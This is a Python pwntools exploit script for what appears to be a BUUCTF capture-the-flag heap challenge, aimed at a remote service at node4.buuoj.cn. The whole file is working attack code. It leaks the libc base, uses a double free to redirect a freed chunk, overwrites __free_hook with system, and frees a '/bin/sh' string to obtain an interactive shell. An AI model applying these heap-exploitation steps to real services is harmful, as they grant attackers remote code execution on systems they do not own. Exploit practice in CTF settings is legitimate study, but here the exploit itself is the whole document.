#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/07/18 10:45:47
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = 'amd64'
if debug:
    if context.arch == "amd64":
        # sh = process(['./'],env={'LD_PRELOAD':'/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so'})
	sh = process('./pwn')
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        one_offset = [0x45226,0x4527a,0xf03a4,0xf1247]
    else:
        # sh = process(['./pwn'],env={'LD_PRELOAD':'/home/eur1ka/Desktop/Pwn/libc_file/16-32-libc-2.23.so'})
	sh = process('./pwn')

        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        one_offset = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]
else:
    IP = 'node4.buuoj.cn'
    port = 29814
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
    one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
elf = ELF('pwn')

def debug():
    gdb.attach(sh)
    pause()

def cmd(choice):
    sh.recvuntil("Your choice:")
    sh.sendline(str(choice))

def add_1(chapter):
    cmd(1)
    sh.recvuntil("Chapter name:")
    sh.sendline(chapter)

def add_2(chapter,section):
    cmd(2)
    sh.recvuntil("Which chapter do you want to add into:")
    sh.sendline(chapter)
    sh.recvuntil("0x0x")
    leak_addr = int(sh.recv(12),16)
    sh.recvuntil("Section name:")
    sh.sendline(section)
    return leak_addr

def add_3(section,size,text):
    cmd(3)
    sh.recvuntil("Which section do you want to add into:")
    sh.sendline(section)
    sh.recvuntil("How many chapters you want to write:")
    sh.sendline(str(size))
    sh.recvuntil("Text:")
    sh.sendline(text)

def dele_1(chapter):
    cmd(4)
    sh.recvuntil("Chapter name:")
    sh.sendline(chapter)

def dele_2(section):
    cmd(5)
    sh.recvuntil("Section name:")
    sh.sendline(section)


def dele_3(section):
    cmd(6)
    sh.recvuntil("Section name:")
    sh.sendline(section)

def show():
    cmd(7)

def edit(choice,name,content):
    cmd(8)
    sh.recvuntil("What to update?(Chapter/Section/Text):")
    if choice == 1:
        sh.sendline("Chapter")

    elif choice == 2:
        sh.sendline("Section")

    elif choice == 3:
        sh.sendline("Text")

    sh.recvuntil("name:")
    sh.sendline(name)
    sh.recvuntil("New")
    sh.recvuntil(":")
    sh.sendline(content)
name = p64(0) + p64(0x41)
sh.recvuntil("Name of the book you want to create: ")
sh.sendline(name)

add_1("chapter_1")
heap_addr = add_2("chapter_1","section_1")
add_1("chapter_2")
add_2("chapter_2","section_2")
add_3("section_1",0x100,"text_1")
add_3("section_2",0x100,"text_2")
dele_3("section_1")
add_3("section_1",0x100,"")
show()
sh.recvuntil("Text:")
libc_base = u64(sh.recv(6).ljust(8,"\x00")) - 0x3c4b78
free_hook = libc_base + libc.symbols['__free_hook']
system_addr = libc_base + libc.symbols['system']
log.info("libc_base=>{}".format(hex(libc_base)))
log.info("heap_addr=>{}".format(hex(heap_addr)))
# debug()
dele_3("section_1")
dele_3("section_2")
dele_2("section_1")
dele_2("section_2")
dele_2("section_1")
edit(2,p64(0),p64(heap_addr-0x120))
add_2("chapter_1","section_1")
add_2("chapter_2","section_2")
add_1("/bin/sh\x00")
add_2("/bin/sh\x00","section_3")
edit(2,"section_3",p64(0)*2+p64(free_hook))
edit(1,p64(0),p64(system_addr))
dele_1("/bin/sh\x00")
sh.interactive()